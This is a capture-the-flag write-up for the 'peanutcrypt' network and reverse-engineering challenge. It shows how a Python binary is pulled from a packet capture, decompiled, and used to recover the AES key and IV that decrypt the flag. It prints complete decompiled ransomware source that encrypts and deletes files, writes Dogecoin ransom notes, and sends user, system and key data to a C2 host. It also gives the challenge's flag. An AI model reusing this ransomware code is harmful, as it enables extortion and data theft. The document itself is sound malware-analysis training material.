peanutcrypt  
Category: Network/Reverse Engineering  

Description: I was hosting a CTF when someone came and stole all my flags?  
Can you help me get them back?  
Flag format: CTF{sha256}  

Link to the challenge: https://app.cyber-edu.co/challenges/98d79d60-7d54-4391-80c5-98858c402105?tenant=unbreakable

For this ctf, I had to extract and reverse a compiled python binary, then decrypt the original message, which was the flag.

Firstly I opened wireshark, and looked through TCP streams, and on stream 47 I found the binary.  

<img width="1908" height="916" alt="image" src="https://github.com/user-attachments/assets/9e988ee9-0373-4a90-8571-7d89eaa2fa85" />

I extracted the binary by going to File -> Export Objects -> HTTP, then scrolling to the bottom and then I saved the binary.  

<img width="745" height="545" alt="image" src="https://github.com/user-attachments/assets/af882ade-1b41-4c65-bf79-3e42cac9ce3f" />

I decompiled the binary using decompyle3, and got the original python code.  

```
import random, time, getpass, platform, hashlib, os, socket, sys
from Crypto.Cipher import AES
c2 = ('peanutbotnet.nuts', 31337)
super_secret_encoding_key = b'\x04NA\xedc\xabt\x8c\xe5\x11o\x143B\xea\xa2'
lets_not_do_this = True
doge_address = "DCBk3WqNVfSSMe5kqwCFg7m6QDbjkT5nfR"
uid = "undefined"

def write_ransom(path):
    ransom_file = open(path + "_ransom.txt", "w")
    ransom_file.write(f"Your files have been encrypted by PeanutCrypt.\nSend 5000 DogeCoin to {doge_address} along with {uid} to recover your data")


def encrypt_reccursive(path, key, iv):
    for dirpath, dirnames, filenames in os.walk(path):
        for dirname in dirnames:
            write_ransom(dirname + "/")

        for filename in filenames:
            encrypt_file(dirpath + "/" + filename, key, iv)


def encrypt_file(path, key, iv):
    bs = AES.block_size
    cipher = AES.new(key, AES.MODE_CBC, iv)
    in_file = open(path, "rb")
    out_file = open(path + ".enc", "wb")
    finished = False
    while not finished:
        chunk = in_file.read(1024 * bs)
        if len(chunk) == 0 or len(chunk) % bs != 0:
            padding_length = bs - len(chunk) % bs or bs
            chunk += str.encode(padding_length * chr(padding_length))
            finished = True
        else:
            out_file.write(cipher.encrypt(chunk))

    os.remove(path)


def encode_message(message):
    encoded_message = b''
    for i, char in enumerate(message):
        encoded_message += bytes([ord(char) ^ super_secret_encoding_key[i % 16]])

    return encoded_message


def send_status(status):
    message = f'{status} {uid} {getpass.getuser()} {"".join(platform.uname())}'
    encoded_message = encode_message(message)
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.sendto(encoded_message, c2)


def send_key(key, iv):
    message = f"{uid} " + key.hex() + " " + iv.hex()
    encoded_message = encode_message(message)
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.connect(c2)
    print(encoded_message)
    tcp_socket.sendall(encoded_message)
    tcp_socket.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <file/directory>")
        sys.exit(1)
    path = sys.argv[1]
    hash = hashlib.sha256()
    hash.update(os.urandom(16))
    uid = hash.hexdigest()
    send_status("WAITING")
    time.sleep(random.randint(60, 120))
    send_status("ENCRYPTING")
    key = os.urandom(16)
    iv = os.urandom(16)
    if os.path.isfile(path):
        encrypt_file(path, key, iv)
        write_ransom(path)
    if os.path.isdir(path):
        if not lets_not_do_this:
            encrypt_reccursive(path, key, iv)
    send_key(key, iv)
    send_status("DONE")
```

Basically what it does, is encrypting the flag using AES-128-CBC and sending the random made key and random made IV along the SHA-256 digest of the UID.  

To extract the key and IV, I had to look through the packets on TCP destination port 31337, and found this packet.  

<img width="1534" height="586" alt="image" src="https://github.com/user-attachments/assets/d4ceb25b-0d9c-484d-b407-f50a5515ddc1" />  

I extracted the data, and the last 64 bytes were the key and the IV.  
Key - 56204c6a395ff830697e5c1c9062d854  
IV - a153cdacb6813e693e4dc109a01dc9dd  

Now I went to CyberChef, uploaded flag.enc as input, and put AES Decrypt, with the key and IV as hex, and input and output were set to raw.  

<img width="1183" height="561" alt="image" src="https://github.com/user-attachments/assets/75f7bf8a-d343-445a-a1da-da3c5f8d8cc4" />

Flag: `CTF{1fdbc7dd3c51c7b47585856b9d2b04a3a115ff88e615917ffb652f9ca3c1806e}`

